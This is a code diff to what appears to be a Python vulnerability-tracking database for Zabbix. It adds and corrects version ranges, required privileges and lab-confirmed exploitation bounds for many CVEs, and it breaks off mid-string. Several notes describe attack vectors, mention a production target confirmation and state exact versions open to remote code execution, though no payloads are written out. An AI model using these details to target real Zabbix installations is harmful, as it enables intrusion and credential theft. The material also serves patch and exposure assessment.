@@ -66,96 +66,382 @@ CURATIONS: dict[str, dict] = {
         "affected_versions": [
             {"branch": "5.4", "min": "5.4.0", "max": "5.4.8"},
             {"branch": "6.0", "min": "6.0.0alpha1", "max": "6.0.0alpha1",
-             "notes": "только 6.0.0alpha1; 6.0.0beta1 — фикс"},
+             "notes": "only 6.0.0alpha1; 6.0.0beta1 — fix"},
         ],
         "fixed_versions": ["5.4.9", "6.0.0beta1"],
-        "_note": "Курация (исправление): ZBX-20350 — Affected ТОЛЬКО 5.4.0-5.4.8 и 6.0.0alpha1; "
-                "фикс 5.4.9rc2/6.0.0beta1. Ранее ошибочно добавлены ветки 4.0/5.0 "
-                "(путаница с фиксами ZBX-20383/logback 4.0.37/5.0.19) и 6.0 до beta1 — "
-                "удалены. Применима только при включённом SAML (non-default).",
+        "_note": "Curation (correction): ZBX-20350 — Affected ONLY 5.4.0-5.4.8 and 6.0.0alpha1; "
+                "fix 5.4.9rc2/6.0.0beta1. Branches 4.0/5.0 (confusion with the ZBX-20383/logback "
+                "4.0.37/5.0.19 fixes) and 6.0 before beta1 were previously added in error — "
+                "removed. Applicable only when SAML is enabled (non-default).",
     },
     "CVE-2022-23134": {
         "fixed_versions": ["5.4.9", "6.0.0beta2"],
-        "_note": "Курация: в Jira фикс 5.4.9rc2; выпущенный фикс 5.4.9 (SonarSource, TheN00bBuilder PoC).",
+        "_note": "Curation: fix in Jira is 5.4.9rc2; released fix 5.4.9 (SonarSource, TheN00bBuilder PoC).",
     },
     "CVE-2023-32725": {
         "component": "frontend",
         "fixed_versions": ["6.0.22", "6.4.7", "7.0.0a4"],
-        "_note": "Курация: ZBX-23854 — URL-widget в scheduled reports (фронтенд, CWE-565), фиксы 6.0.22/6.4.7/7.0.0a4 (в Jira 6.0.22rc1); CVSS 9.6.",
+        "_note": "Curation: ZBX-23854 — URL widget in scheduled reports (frontend, CWE-565), fixes 6.0.22/6.4.7/7.0.0a4 (6.0.22rc1 in Jira); CVSS 9.6.",
     },
     "CVE-2019-17382": {
         "affected_versions": [
             {"branch": "4.4", "min": "4.4.0", "max": "4.4.0"},
         ],
         "fixed_versions": ["4.4.1"],
-        "_note": "Курация: официальная фиксящая версия в NVD отсутствует; по Snyk уязвима 4.4.0, фикс 4.4.1 (ZBX-16789); Debian бэкпорт позже.",
+        "_note": "Curation: no official fixing version in NVD; per Snyk 4.4.0 is vulnerable, fix 4.4.1 (ZBX-16789); Debian backport later.",
     },
     "CVE-2024-22120": {
-        "_note": "Примечание: Zabbix оценивает как high-privileges (auth=admin), NVD — low; фактически вектор требует сессию с доступом к script.execute и host. Права проверять по роли/хосту/скриптам (0xdf HTB Watcher).",
+        "_note": "Note: Zabbix rates it high-privileges (auth=admin), NVD — low; in practice the vector requires a session with access to script.execute and a host. Check permissions against role/host/scripts (0xdf HTB Watcher).",
     },
-    # диапазоны по аudit (research/db_audit.md): критичные расхождения
+    # ranges per the audit (research/db_audit.md): critical discrepancies
     "CVE-2022-43515": {
         "affected_versions": [
-            {"branch": "5.0", "min": "unknown", "max": "5.0.30rc1", "notes": "max эксклюзивный (фикс 5.0.30)"},
-            {"branch": "6.2", "min": "unknown", "max": "6.2.5rc1", "notes": "max эксклюзивный (фикс 6.2.5)"},
+            {"branch": "5.0", "min": "unknown", "max": "5.0.30rc1", "notes": "max exclusive (fix 5.0.30)"},
+            {"branch": "6.2", "min": "unknown", "max": "6.2.5rc1", "notes": "max exclusive (fix 6.2.5)"},
         ],
         "fixed_versions": ["5.0.30", "6.2.5"],
-        "_note": "Аудит: max=rc фикса без exclusive → исправленные версии матчились; max = rc (эксклюзивно).",
+        "_note": "Audit: max=fix rc without exclusive → fixed versions matched; max = fix rc (exclusive).",
     },
     "CVE-2020-15803": {
         "affected_versions": [
-            {"branch": "3.0", "min": "unknown", "max": "3.0.32rc1", "notes": "max эксклюзивный (фикс 3.0.32)"},
-            {"branch": "4.0", "min": "unknown", "max": "4.0.22rc1", "notes": "max эксклюзивный (фикс 4.0.22)"},
-            {"branch": "5.0", "min": "unknown", "max": "5.0.2rc1", "notes": "max эксклюзивный (фикс 5.0.2)"},
+            {"branch": "3.0", "min": "unknown", "max": "3.0.32rc1", "notes": "max exclusive (fix 3.0.32)"},
+            {"branch": "4.0", "min": "unknown", "max": "4.0.22rc1", "notes": "max exclusive (fix 4.0.22)"},
+            {"branch": "5.0", "min": "unknown", "max": "5.0.2rc1", "notes": "max exclusive (fix 5.0.2)"},
         ],
         "fixed_versions": ["3.0.32", "4.0.22", "5.0.2"],
-        "_note": "Аудит: max=rc фикса без exclusive.",
+        "_note": "Audit: max=fix rc without exclusive.",
     },
     "CVE-2021-27927": {
         "affected_versions": [
-            {"branch": "4.0", "min": "unknown", "max": "4.0.22rc1", "notes": "max эксклюзивный (фикс 4.0.22)"},
-            {"branch": "5.0", "min": "unknown", "max": "5.0.8rc1", "notes": "max эксклюзивный (фикс 5.0.8)"},
+            {"branch": "4.0", "min": "unknown", "max": "4.0.22rc1", "notes": "max exclusive (fix 4.0.22)"},
+            {"branch": "5.0", "min": "unknown", "max": "5.0.8rc1", "notes": "max exclusive (fix 5.0.8)"},
         ],
         "fixed_versions": ["4.0.22", "5.0.8"],
-        "_note": "Аудит: max=rc фикса без exclusive.",
+        "_note": "Audit: max=fix rc without exclusive.",
     },
     "CVE-2022-35229": {
-        "_note": "Аудит: 4.0 max='4.0.0' → ложные пропуски 4.0.1-4.0.42; max сжат автоматическим clamp к фиксу ветки (4.0.14?).",
+        "_note": "Audit: 4.0 max='4.0.0' → false negatives 4.0.1-4.0.42; max auto-clamped to the branch fix (4.0.14?).",
     },
     "CVE-2023-29449": {
         "affected_versions": [
             {"branch": "5.0", "min": "unknown", "max": "5.0.31"},
             {"branch": "6.0", "min": "6.0.0", "max": "6.0.13"},
-            {"branch": "6.2", "min": "unknown", "max": "6.2.8rc1", "notes": "max эксклюзивный (добавлено по rn 6.2.8, ZBX-22587/88/89)"},
-            {"branch": "6.4", "min": "6.4.0alpha1", "max": "6.4.0rc1", "notes": "max эксклюзивный"},
+            {"branch": "6.2", "min": "unknown", "max": "6.2.8rc1", "notes": "max exclusive (added per the 6.2.8 rn, ZBX-22587/88/89)"},
+            {"branch": "6.4", "min": "6.4.0alpha1", "max": "6.4.0rc1", "notes": "max exclusive"},
         ],
-        "_note": "Аудит: добавлена пропущенная ветка 6.2 (фикс 6.2.8rc1 уже в fixed_versions).",
+        "_note": "Audit: added the missing 6.2 branch (fix 6.2.8rc1 already in fixed_versions).",
     },
     "CVE-2023-29450": {
         "affected_versions": [
             {"branch": "5.0", "min": "unknown", "max": "5.0.31"},
-            {"branch": "6.0", "min": "6.0.0", "max": "6.0.13", "notes": "фикс 6.0.14 (CURLOPT_PROTOCOLS, фактический код-фикс; deep_vectors.md)"},
-            {"branch": "6.2", "min": "unknown", "max": "6.2.7", "notes": "фикс 6.2.8 по комментарию ([INFERENCE])"},
-            {"branch": "6.4", "min": "6.4.0", "max": "6.4.1", "notes": "фикс 6.4.2rc1 по Jira"},
+            {"branch": "6.0", "min": "6.0.0", "max": "6.0.13", "notes": "fix 6.0.14 (CURLOPT_PROTOCOLS, actual code fix; deep_vectors.md)"},
+            {"branch": "6.2", "min": "unknown", "max": "6.2.7", "notes": "fix 6.2.8 per comment ([INFERENCE])"},
+            {"branch": "6.4", "min": "6.4.0", "max": "6.4.1", "notes": "fix 6.4.2rc1 per Jira"},
         ],
-        "_note": "Курация по deep_vectors.md (код): фактические границы 5.0.32/6.0.14/6.2.8/6.4.2rc1; Jira-заголовок (6.0.16rc1) консервативнее кода — взяты код-проверенные.",
+        "_note": "Curation per deep_vectors.md (code): actual bounds 5.0.32/6.0.14/6.2.8/6.4.2rc1; the Jira title (6.0.16rc1) is more conservative than the code — code-verified bounds taken.",
     },
     "CVE-2020-11800": {
         "affected_versions": [
-            {"branch": "2.2", "min": "2.2.19", "max": "unknown", "notes": "2.2.19+ после неполного патча CVE-2017-2824; EOL, фикса нет"},
-            {"branch": "3.0", "min": "unknown", "max": "3.0.30", "notes": "max эксклюзивный; фикс 3.0.31"},
-            {"branch": "3.2", "min": "unknown", "max": "unknown", "notes": "вся ветка, EOL"},
+            {"branch": "2.2", "min": "2.2.19", "max": "unknown", "notes": "2.2.19+ after the incomplete CVE-2017-2824 patch; EOL, no fix"},
+            {"branch": "3.0", "min": "unknown", "max": "3.0.30", "notes": "max exclusive; fix 3.0.31"},
+            {"branch": "3.2", "min": "unknown", "max": "unknown", "notes": "entire branch, EOL"},
         ],
         "fixed_versions": ["3.0.31"],
-        "_note": "Курация по deep_vectors.md/vulhub: траппер-механика (auto-registration ip + command scriptid=1); 3.4+/4.0/5.0 не затронуты.",
+        "_note": "Curation per deep_vectors.md/vulhub: trapper mechanics (auto-registration ip + command scriptid=1); 3.4+/4.0/5.0 not affected.",
     },
     "CVE-2023-29451": {
         "affected_versions": [
             {"branch": "6.0", "min": "unknown", "max": "6.0.14"},
-            {"branch": "6.2", "min": "unknown", "max": "6.2.9rc2", "notes": "max эксклюзивный (добавлено по rn 6.2.9, ZBX-22587/88/89)"},
-            {"branch": "6.4", "min": "6.4.0alpha1", "max": "6.4.1rc1", "notes": "max эксклюзивный"},
+            {"branch": "6.2", "min": "unknown", "max": "6.2.9rc2", "notes": "max exclusive (added per the 6.2.9 rn, ZBX-22587/88/89)"},
+            {"branch": "6.4", "min": "6.4.0alpha1", "max": "6.4.1rc1", "notes": "max exclusive"},
         ],
-        "_note": "Аудит: добавлена пропущенная ветка 6.2 (фикс 6.2.9rc2 уже в fixed_versions).",
+        "_note": "Audit: added the missing 6.2 branch (fix 6.2.9rc2 already in fixed_versions).",
+    },
+    # ---- P5 (2026-11): official ranges researched from Jira ZBX + NVD CNA
+    # (security@zabbix.com), confirmed against the zabbix_security_advisories.rss RSS ----
+    "CVE-2026-23920": {
+        "affected_versions": [
+            {"branch": "7.0", "min": "7.0.0", "max": "7.0.22", "notes": "max exclusive (fix 7.0.22)"},
+            {"branch": "7.2", "min": "7.2.0", "max": "7.2.15", "notes": "max exclusive (fix 7.2.15)"},
+            {"branch": "7.4", "min": "7.4.0", "max": "7.4.6", "notes": "max exclusive (fix 7.4.6)"},
+        ],
+        "fixed_versions": ["7.0.22", "7.2.15", "7.4.6"],
+        "component": "server",
+        "auth": "user",
+        "_note": "Official (ZBX-27639, ZBV-2026-03-24-2, NVD CNA): multiline-regex bypass in "
+                 "host/event action script validation → shell command injection on server/proxy. Affected 7.0.0-7.0.21 / "
+                 "7.2.0-7.2.14 / 7.4.0-7.4.5.",
+    },
+    "CVE-2026-23922": {
+        "affected_versions": [
+            {"branch": "7.4", "min": "7.4.0", "max": "7.4.9", "notes": "max exclusive (fix 7.4.9)"},
+        ],
+        "fixed_versions": ["7.4.9"],
+        "component": "frontend",
+        "auth": "superadmin",
+        "_note": "Official (ZBX-28067, ZBV-2026-08-18-1): OAuth client secret leak via Token endpoint "
+                 "substitution (superadmin). Affected 7.4.0-7.4.8.",
+    },
+    "CVE-2026-23923": {
+        "affected_versions": [
+            {"branch": "7.4", "min": "7.4.0", "max": "7.4.7", "notes": "max exclusive (fix 7.4.7)"},
+        ],
+        "fixed_versions": ["7.4.7"],
+        "component": "frontend",
+        "auth": "none",
+        "_note": "Official (ZBX-27641, ZBV-2026-03-24-4): unauthenticated instantiation of an arbitrary PHP class "
+                 "via the frontend validate action (autoloader oracle). Affected 7.4.0-7.4.6. Confirmed on production 7.4.3 "
+                 "(reports/zabbix_targets_2026-10-28.md, SA-6) and PoC exploits/cve-2026-23923-validate-oracle.sh.",
+    },
+    "CVE-2026-23926": {
+        "affected_versions": [
+            {"branch": "7.0", "min": "7.0.0", "max": "7.0.24", "notes": "max exclusive (fix 7.0.24)"},
+            {"branch": "7.4", "min": "7.4.0", "max": "7.4.8", "notes": "max exclusive (fix 7.4.8)"},
+        ],
+        "fixed_versions": ["7.0.24", "7.4.8"],
+        "component": "frontend",
+        "auth": "admin",
+        "_note": "Official (ZBX-27758, ZBV-2026-05-06-1): stored XSS in the Host navigator widget tooltip via a maintenance "
+                 "period (admin, not superadmin). Affected 7.0.0-7.0.23 / 7.4.0-7.4.7.",
+    },
+    "CVE-2026-23927": {
+        "affected_versions": [
+            {"branch": "6.0", "min": "6.0.0", "max": "6.0.45", "notes": "max exclusive (fix 6.0.45)"},
+            {"branch": "7.0", "min": "7.0.0", "max": "7.0.24", "notes": "max exclusive (fix 7.0.24)"},
+            {"branch": "7.4", "min": "7.4.0", "max": "7.4.8", "notes": "max exclusive (fix 7.4.8)"},
+        ],
+        "fixed_versions": ["6.0.45", "7.0.24", "7.4.8"],
+        "component": "agent",
+        "auth": "none",
+        "_note": "Official (ZBX-27759, ZBV-2026-05-06-2): TNS connection string injection in the Agent 2 Oracle plugin "
+                 "(service parameter) → connection to the attacker's server, leak of stored Oracle credentials. "
+                 "No Zabbix authentication needed — network access to Agent 2 suffices. Affected 6.0.0-6.0.44 / "
+                 "7.0.0-7.0.23 / 7.4.0-7.4.7.",
+    },
+    "CVE-2026-23929": {
+        "affected_versions": [
+            {"branch": "6.0", "min": "6.0.44", "max": "6.0.46", "notes": "max exclusive (fix 6.0.46); min = version where searchParamsToObject appeared (vendor git range)"},
+            {"branch": "7.0", "min": "7.0.22", "max": "7.0.25", "notes": "max exclusive (fix 7.0.25); min = vendor git range"},
+            {"branch": "7.4", "min": "7.4.6", "max": "7.4.9", "notes": "max exclusive (fix 7.4.9); min = vendor git range"},
+        ],
+        "fixed_versions": ["6.0.46", "7.0.25", "7.4.9"],
+        "component": "frontend",
+        "auth": "user",
+        "_note": "Official (ZBX-28068, ZBV-2026-08-18-2): prototype pollution in searchParamsToObject() → persistent "
+                 "XSS in Maps. Bounds from the CNA vendor git ranges (narrower than NVD CPE): introduced 6.0.44/7.0.22/7.4.6, "
+                 "last affected 6.0.45/7.0.24/7.4.8.",
+    },
+    "CVE-2026-23930": {
+        "affected_versions": [
+            {"branch": "6.0", "min": "6.0.0", "max": "6.0.47", "notes": "max exclusive (fix 6.0.47)"},
+            {"branch": "7.0", "min": "7.0.0", "max": "7.0.27", "notes": "max exclusive (fix 7.0.27)"},
+            {"branch": "7.4", "min": "7.4.0", "max": "7.4.11", "notes": "max exclusive (fix 7.4.11)"},
+        ],
+        "fixed_versions": ["6.0.47", "7.0.27", "7.4.11"],
+        "component": "frontend",
+        "auth": "none",
+        "_note": "Official (ZBX-28069, ZBV-2026-08-18-3): unauthenticated frontend DoS via popup.testtriggerexpr "
+                 "(CWE-405). The 7.2 branch is NOT affected (EOL, not covered by the advisory). Last affected 6.0.46/7.0.26/7.4.10.",
+    },
+    "CVE-2026-23931": {
+        "affected_versions": [
+            {"branch": "7.4", "min": "7.4.0", "max": "7.4.11", "notes": "max exclusive (fix 7.4.11)"},
+        ],
+        "fixed_versions": ["7.4.11"],
+        "component": "frontend",
+        "auth": "user",
+        "_note": "Official (ZBX-28070, ZBV-2026-08-18-4): enumeration of plaintext user macro values via "
+                 "validate.api.exists (CWE-203). 7.4 only (last affected 7.4.10); secret/vault macros not affected.",
+    },
+    "CVE-2026-23934": {
+        "affected_versions": [
+            {"branch": "7.4", "min": "7.4.0", "max": "7.4.12", "notes": "max exclusive (fix 7.4.12)"},
+        ],
+        "fixed_versions": ["7.4.12"],
+        "component": "frontend",
+        "auth": "user",
+        "_note": "Official (ZBX-28072, ZBV-2026-08-18-6): DoS via validate.api.exists (CWE-405), neighbor of CVE-2026-23931, "
+                 "fix scheduled for a later patch. 7.4 only (last affected 7.4.11).",
+    },
+    "CVE-2026-59785": {
+        "affected_versions": [
+            {"branch": "6.0", "min": "6.0.0", "max": "6.0.48", "notes": "max exclusive (fix 6.0.48)"},
+            {"branch": "7.0", "min": "7.0.0", "max": "7.0.29", "notes": "max exclusive (fix 7.0.29)"},
+            {"branch": "7.4", "min": "7.4.0", "max": "7.4.13", "notes": "max exclusive (fix 7.4.13)"},
+        ],
+        "fixed_versions": ["6.0.48", "7.0.29", "7.4.13"],
+        "component": "frontend",
+        "auth": "user",
+        "_note": "Official (ZBX-28195, ZBV-2026-10-05-3, CWE-204): host search (multiselect.get) response discrepancy — "
+                 "filtering on non-displayed fields (IPMI/PSK) allows confirming guessed credentials. "
+                 "Last affected 6.0.47/7.0.28/7.4.12.",
+    },
+    "CVE-2026-59788": {
+        "affected_versions": [
+            {"branch": "7.4", "min": "7.4.0", "max": "7.4.12", "notes": "max exclusive (fix 7.4.12)"},
+        ],
+        "fixed_versions": ["7.4.12"],
+        "component": "frontend",
+        "auth": "superadmin",
+        "_note": "Official (ZBX-28198, ZBV-2026-10-05-6): stored XSS — the Authorization endpoint email media type is passed "
+                 "to window.open() without scheme validation (javascript: URL); delivery via media type import. 7.4 only "
+                 "(last affected 7.4.11).",
+    },
+    "CVE-2025-27231": {
+        "affected_versions": [
+            {"branch": "6.0", "min": "6.0.0", "max": "6.0.41", "notes": "max exclusive (fix 6.0.41)"},
+            {"branch": "7.0", "min": "7.0.0", "max": "7.0.18", "notes": "max exclusive (fix 7.0.18)"},
+            {"branch": "7.2", "min": "7.2.0", "max": "7.2.12", "notes": "max exclusive (fix 7.2.12)"},
+            {"branch": "7.4", "min": "7.4.0", "max": "7.4.2", "notes": "max exclusive (fix 7.4.2)"},
+        ],
+        "fixed_versions": ["6.0.41", "7.0.18", "7.2.12", "7.4.2"],
+        "component": "frontend",
+        "auth": "superadmin",
+        "_note": "Official (ZBX-27062, ZBV-2025-10-03-3, CWE-522): LDAP Bind password leak by a superadmin via LDAP Host "
+                 "substitution. NOT the OAuth family (unlike its neighbor CVE-2025-27232) and NOT 7.4-only: "
+                 "6.0/7.0/7.2/7.4 affected. Last affected 6.0.40/7.0.17/7.2.11/7.4.1.",
+    },
+    # ---- excluded entries (not vulnerabilities / not applicable) ----
+    "CVE-2016-9140": {
+        "excluded": True,
+        "_note": "EXCLUDED: CVE WITHDRAWN by the CNA (Red Hat, vulnStatus=Rejected in NVD): 'Further investigation showed that "
+                 "it was not a security issue'. The vulnerability does not exist; any historical affected data is "
+                 "invalid. Matching impossible (affected empty).",
+    },
+    "ZBX-20349": {
+        "excluded": True,
+        "_note": "EXCLUDED: ZBX-20349 is NOT a vulnerability but a Log4Shell (CVE-2021-44228) inquiry about the Java Gateway. "
+                 "Closed Won't Fix (2024-04-10): Zabbix Java Gateway ships SLF4J/logback 1.2.3, not Apache Log4j 2.x "
+                 "— Log4Shell not applicable. The official Zabbix advisory database contains no log4j advisory at all.",
+    },
+    "CVE-2021-46088": {
+        "affected_versions": [
+            {"branch": "4.0", "min": "unknown", "max": "4.0.34", "notes": "NVD: affected ≤4.0.34 (inclusive)"},
+            {"branch": "4.2", "min": "unknown", "max": "4.2.8", "notes": "NVD: affected ≤4.2.8 (inclusive)"},
+            {"branch": "4.4", "min": "unknown", "max": "4.4.10", "notes": "NVD says ≤4.4.11, but 4.4.11 does not exist (last real patch 4.4.10); branch EOL"},
+            {"branch": "5.0", "min": "unknown", "max": "5.0.20", "notes": "NVD: affected ≤5.0.20 (inclusive)"},
+        ],
+        "fixed_versions": ["4.0.35", "4.2.9", "5.0.21"],
+        "_note": "Audit (§4): all ranges were unknown/unknown (the record never matched). Filled from NVD: "
+                 "Zabbix Admin role → shell scripts (RCE). No fix for 4.4 (branch EOL).",
+    },
+    "CVE-2022-35230": {
+        "affected_versions": [
+            {"branch": "4.0", "min": "unknown", "max": "4.0.43rc1", "notes": "max exclusive (fix 4.0.43)"},
+            {"branch": "5.0", "min": "unknown", "max": "5.0.25rc1", "notes": "max exclusive (fix 5.0.25); min was erroneously 5.0.25 (inversion)"},
+            {"branch": "6.0", "min": "6.0.0", "max": "6.0.5rc1", "notes": "max exclusive (fix 6.0.5)"},
+        ],
+        "fixed_versions": ["4.0.43", "5.0.25", "6.0.5"],
+        "_note": "Audit/repair: only 5.0 was present (5.0.25→5.0.25rc1 — inversion from clamping), misses on 4.0/6.0. "
+                 "Branch 6.2 not added (fix 6.2.0rc1 predates the first 6.2 release). Reflected XSS in graphs.",
+    },
+    "CVE-2016-10742": {
+        "affected_versions": [
+            {"branch": "2.2", "min": "unknown", "max": "2.2.20"},
+            {"branch": "3.0", "min": "3.0.0", "max": "3.0.12"},
+            {"branch": "3.1", "min": "3.1.0", "max": "3.1.0", "notes": "unreleased dev branch, degraded to an empty set (audit §3a)"},
+            {"branch": "3.3", "min": "3.3.0", "max": "3.3.0", "notes": "unreleased dev branch, degraded to an empty set (audit §3a)"},
+        ],
+        "_note": "Audit §3a: branches 3.1/3.3 are unreleased (no patches in versions.json); max=unknown → matched the entire phantom branch.",
+    },
+    "ZBX-16792": {
+        "affected_versions": [
+            {"branch": "5.0", "min": "unknown", "max": "unknown",
+             "notes": "the whole 5.0 branch: max='5.0' was a branch marker (matched almost nothing); the masking fix version is not stated in the advisory"},
+        ],
+        "_note": "Audit §3a: max='5.0' is a branch marker instead of a patch version. Passwords in Docker container logs; "
+                 "the upper bound is unknown — the whole branch (5.0 LTS, potential over-match on patched installs, noted).",
+    },
+    "CVE-2019-15132": {
+        "fixed_versions": ["4.0.27", "4.4.1", "5.0.6", "5.2.2"],
+        "_note": "Audit §3a: fixed_versions=['4.2'] was a branch marker. Concretized from the affected bounds "
+                 "(≤4.0.26/4.4.0alpha1/≤5.0.5/≤5.2.1 → fixes = the next patch of each branch).",
+    },
+    # --- Empirical extensions (P6 lab sweep 2026-11-02, docker 4.0.46/5.0.44/6.0.42/7.0.19/7.2.11/7.4.3) ---
+    "CVE-2021-46088": {
+        "affected_versions": [
+            {"branch": "4.0", "min": "unknown", "max": "unknown",
+             "notes": "no fix — entire branch (empirically works on 4.0.46)"},
+            {"branch": "4.2", "min": "unknown", "max": "unknown",
+             "notes": "no fix — entire branch"},
+            {"branch": "4.4", "min": "unknown", "max": "unknown",
+             "notes": "no fix — entire branch"},
+            {"branch": "5.0", "min": "unknown", "max": "unknown",
+             "notes": "no fix — entire branch (empirically works on 5.0.44)"},
+            {"branch": "5.2", "min": "unknown", "max": "unknown", "notes": "empirically: entire branch (lab 5.2.7 EXPLOITED)"},
+            {"branch": "5.4", "min": "unknown", "max": "unknown", "notes": "empirically: entire branch (lab 5.4.8/5.4.12 EXPLOITED)"},
+            {"branch": "6.0", "min": "unknown", "max": "unknown", "notes": "empirically: 6.0.27/6.0.31/6.0.49 + lab 6.0.42 — works"},
+            {"branch": "6.2", "min": "unknown", "max": "unknown", "notes": "empirically: 6.2.9 EXPLOITED"},
+            {"branch": "6.4", "min": "unknown", "max": "unknown", "notes": "empirically: 6.4.21 EXPLOITED"},
+            {"branch": "7.0", "min": "unknown", "max": "unknown", "notes": "empirically: lab 7.0.19 — works"},
+            {"branch": "7.2", "min": "unknown", "max": "unknown", "notes": "empirically: lab 7.2.11 — works"},
+            {"branch": "7.4", "min": "unknown", "max": "unknown", "notes": "empirically: lab 7.4.3 — works"},
+        ],
+        "_note": "EMPIRICAL EXTENSION (P6 sweep 2026-11-02): the primitive (Admin creates+executes a "
+                 "shell script via the API) works on ALL branches 4.0–7.4 (lab: 4.0.46/5.0.44/6.0.42/"
+                 "7.0.19/7.2.11/7.4.3 + earlier verifies 5.0.5–6.4.21). No fix in current branches — "
+                 "the vendor considers script execution normal behavior for roles with script permissions; treat it "
+                 "as privilege-hygiene (Admin != RCE by default), not a classic RCE.",
+    },
+    "CVE-2024-36460": {
+        "affected_versions": [
+            {"branch": "5.0", "min": "5.0.0", "max": "5.0.42"},
+            {"branch": "6.0", "min": "6.0.0", "max": "6.0.30"},
+            {"branch": "6.4", "min": "6.4.0", "max": "6.4.15"},
+            {"branch": "7.0", "min": "7.0.0", "max": "unknown",
+             "notes": "the official fix 7.0.1 covered the frontend; empirically the auditlog.get API returns passwords on 7.0.19 (lab 2026-11-02) — entire branch"},
+            {"branch": "7.2", "min": "unknown", "max": "unknown",
+             "notes": "empirically (lab 2026-11-02): auditlog.get returns plaintext passwords on 7.2.11"},
+            {"branch": "7.4", "min": "unknown", "max": "unknown",
+             "notes": "empirically (lab 2026-11-02): works on 7.4.3"},
+        ],
+        "_note": "EMPIRICAL EXTENSION (P6 sweep): the API-level auditlog.get returns plaintext passwords "
+                 "on 7.2.11 and 7.4.3 outside the official range (the official fix covered the frontend; 6.0.42 clean).",
+    },
+    "CVE-2024-36464": {
+        "affected_versions": [
+            {"branch": "4.0", "min": "unknown", "max": "unknown",
+             "notes": "empirically (lab 2026-11-02): media type secrets are returned by the API on 4.0.46"},
+            {"branch": "6.0", "min": "unknown", "max": "6.0.30rc1", "notes": "max exclusive (fix 6.0.30)"},
+            {"branch": "6.4", "min": "6.4.0", "max": "6.4.15rc1", "notes": "max exclusive (fix 6.4.15)"},
+        ],
+        "_note": "EMPIRICAL EXTENSION (P6 sweep): media type export/API returns the password in plaintext on 4.0.46 "
+                 "(outside the official 6.0/6.4). No leak observed on 5.0.44.",
+    },
+    "CVE-2025-27234": {
+        "_note": "EMPIRICAL BOUNDARY (P6, docker bisect 2026-11-02): shell RCE confirmed with touch markers on "
+                 "5.0.25/5.0.29/5.0.30/5.0.31/5.0.35/5.0.38; 5.0.39 — smartctl executes but WITHOUT a shell (argv); "
+                 "5.0.44 — whitelist ('Invalid characters'); 5.0.10 — smart.disk.get has no parameters yet; "
+                 "6.0.42/7.0.19/7.2.11/7.4.3 — argv injection without RCE. The official ZBX-26985 range (up to 5.0.46) "
+                 "is kept for the CVE record; for exploitation the RCE boundary = 5.0.x ≤5.0.38.",
+    },
+    "CVE-2026-23925": {
+        "affected_versions": [
+            {"branch": "6.0", "min": "6.0.0", "max": "6.0.41",
+             "notes": "max exclusive (fix 6.0.41); empirically 6.0.40 VULN / 6.0.41 fix (2026-11-02)"},
+            {"branch": "7.0", "min": "7.0.0", "max": "7.0.18",
+             "notes": "max exclusive (fix 7.0.18); empirically 7.0.17 VULN / 7.0.18 fix (2026-11-02)"},
+            {"branch": "7.2", "min": "7.2.0", "max": "7.2.12",
+             "notes": "WIDENING 2026-11-02: 7.2 is absent from advisory ZBX-27567, but empirically "
+                      "7.2.11 VULN, the fix silently appeared in 7.2.12. Max exclusive."},
+            {"branch": "7.4", "min": "7.4.0", "max": "7.4.2",
+             "notes": "max exclusive (fix 7.4.2); empirically 7.4.1 VULN / 7.4.2 fix (2026-11-02)"},
+        ],
+        "_note": "REFINED PROBE + BOUNDS (2026-11-02, ZBX-27567 cross-checked against Jira): the vector is a User role "
+                 "(type 1) with rw on a host group creating a host via configuration.import (import bypasses "
+                 "the host-creation role gate; no version writes into a group without permissions — the "
+                 "group-perm check works there). Verified bounds (docker, import format per branch): "
+                 "6.0.40 VULN / 6.0.41 fix; 7.0.17 VULN / 7.0.18 fix; 7.4.1 VULN / 7.4.2 fix; "
+                 "7.2.11 VULN / 7.2.12 fix. Format nuances: 7.x YAML with uuid in host_groups; 6.0 YAML "
+                 "without a host_groups section at all; 5.x/4.x — outside the official 6.0+ range (no roles).",
+    },
+    "CVE-2026-1199": {
+        "_note": "P6 empirics (2026-11-02): the absence of brute-force blocking (>5 failures without lockout) also "
+                 "on 4.0.46/5.0.44/7.2.11 — this is a missing feature, not the claimed CVE; range not extended.",
+    },
+    "CVE-2013-3628": {
+        "_note": "P6 empirics (2026-11-02): the basic primitive (Admin script-exec via the API) reproduces on "
+                 "all current branches (see CVE-2021-46088) — not applicable to the 2.0.9 range.",
     },
 }
 
@@ -185,36 +471,36 @@ VERIFIED: dict[str, list[dict]] = {
         {"version": "5.0.46-alpine agent2", "result": "negative", "when": "2026-10-28",
          "conditions": "own live container zlab_agent2_5; raw 5.0 passive protocol "
                        "(ZBXD\\x01+LE64 raw item key); smart.disk.get[device,mode]",
-         "note": "RCE-флейвор НЕ воспроизведён: параметры проходят cleanRegex "
-                 "^[a-zA-Z0-9 \\-_/\\\\\\\\.]*$ (clearString, добавлен в 5.0.40, DEV-2701) — все "
-                 "shell-метасимволы (;,|,&,$(),backticks,кавычки,\\n) отклоняются с "
-                 "ZBX_NOTSUPPORTED 'Invalid characters found in parameter'. Код-путь всё ещё "
-                 "shell-бекед (zbxcmd.ExecuteStrict -> exec.Command('sh','-c','sudo -n smartctl <args>'), "
-                 "подтверждено исходниками tag 5.0.46) — RCE возможен только на 5.0.0-5.0.39 без regex; "
-                 "5.0.47 переписан на exec-массив (controller.go, ZBX-23858). Флаг-инъекция в argv "
-                 "smartctl работает (-V долетает, smartctl версия в выводе)."},
+         "note": "RCE flavor NOT reproduced: parameters pass the cleanRegex "
+                 "^[a-zA-Z0-9 \\-_/\\\\\\\\.]*$ (clearString, added in 5.0.40, DEV-2701) — all "
+                 "shell metacharacters (;,|,&,$(),backticks,quotes,\\n) are rejected with "
+                 "ZBX_NOTSUPPORTED 'Invalid characters found in parameter'. The code path is still "
+                 "shell-backed (zbxcmd.ExecuteStrict -> exec.Command('sh','-c','sudo -n smartctl <args>'), "
+                 "confirmed from the tag 5.0.46 sources) — RCE is only possible on 5.0.0-5.0.39 without the regex; "
+                 "5.0.47 was rewritten to the exec array (controller.go, ZBX-23858). Flag injection into the "
+                 "smartctl argv works (-V gets through, smartctl version in the output)."},
         {"version": "7.0.10-alpine agent2", "result": "check-pass", "when": "2026-10-28",
          "conditions": "own live container zlab_agent2; JSON passive checks protocol",
-         "note": "Санитизации НЕТ (параметры verbatim), но вызов через exec-массив "
-                 "(exec.CommandContext('sudo','-n',smartctl,args...), controller.go) — шелла нет, "
-                 "argv-only: флаги (-V, -f, -l scttempsts) доходят до smartctl, исполнения команд нет."},
+         "note": "NO sanitization (parameters verbatim), but the call goes through an exec array "
+                 "(exec.CommandContext('sudo','-n',smartctl,args...), controller.go) — no shell, "
